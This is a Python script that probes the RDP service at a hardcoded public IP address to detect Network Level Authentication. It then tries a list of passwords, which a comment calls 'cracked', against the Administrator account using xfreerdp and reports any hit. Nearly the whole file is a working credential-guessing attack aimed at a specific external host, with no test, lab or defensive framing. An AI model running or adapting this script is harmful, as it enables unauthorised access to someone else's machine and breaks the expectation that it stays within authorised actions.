import socket, struct, hashlib, hmac, os, time

HOST = "8.218.243.29"
PORT = 3389

def test_rdp_password(username, password, domain=""):
    try:
        s = socket.create_connection((HOST, PORT), 8)
        # RDP negotiation
        tpkt = struct.pack(">BBH", 3, 0, 19)
        x224 = struct.pack(">BBHHBB", 19, 0xe0, 0, 0, 0, 1)
        rdp_neg = struct.pack("<I", 1)
        rdp_neg += struct.pack("<B", 0)
        rdp_neg += struct.pack("<H", 8)
        rdp_neg += struct.pack("<I", 7)  # SSL + CredSSP + RDP
        
        s.send(tpkt + x224 + rdp_neg)
        resp = s.recv(1024)
        s.close()
        
        if len(resp) < 11:
            return "SHORT_RESP"
        neg_type = resp[11]
        if neg_type == 2:
            return "NLA_REQUIRED"
        elif neg_type == 3:
            return "NLA_OR_SSL"
        elif neg_type == 1:
            return "SSL_ONLY"
        else:
            return f"UNKNOWN_{neg_type}"
    except socket.timeout:
        return "TIMEOUT"
    except ConnectionRefusedError:
        return "REFUSED"
    except Exception as e:
        return f"ERR: {e}"

# Quick test
print("Testing RDP connection...")
result = test_rdp_password("test", "test")
print(f"RDP negotiate: {result}")

# If NLA, try with known passwords
if "NLA" in result:
    # Test with cracked passwords
    passwords = [
        "admin123", "test123", "shell123",
        "admin", "admin888", "bjhzsv", "bjhzsv123",
        "123456", "password", "Admin123",
    ]
    print("NLA detected, need full auth")
    # NLA needs full CredSSP handshake which is complex
    # Fall back to xfreerdp if available
    import subprocess
    xf = subprocess.run(["which", "xfreerdp"], capture_output=True, text=True)
    if xf.returncode == 0:
        print("xfreerdp available, testing passwords...")
        for pw in passwords[:5]:
            r = subprocess.run([
                "timeout", "8",
                "xvfb-run", "-a",
                "xfreerdp", f"/v:{HOST}", f"/u:Administrator", f"/p:{pw}",
                "/cert-ignore", "/auth-only", "+sec-nla"
            ], capture_output=True, text=True, timeout=10)
            out = r.stdout + r.stderr
            if "Authentication failure" in out or "login failed" in out:
                print(f"  {pw}: FAIL")
            elif "connected" in out.lower() or "success" in out.lower():
                print(f">>> RDP HIT: Administrator/{pw} <<<")
                print(out[:500])
            else:
                print(f"  {pw}: ? {out[:100]}")
    else:
        print("xfreerdp not available")
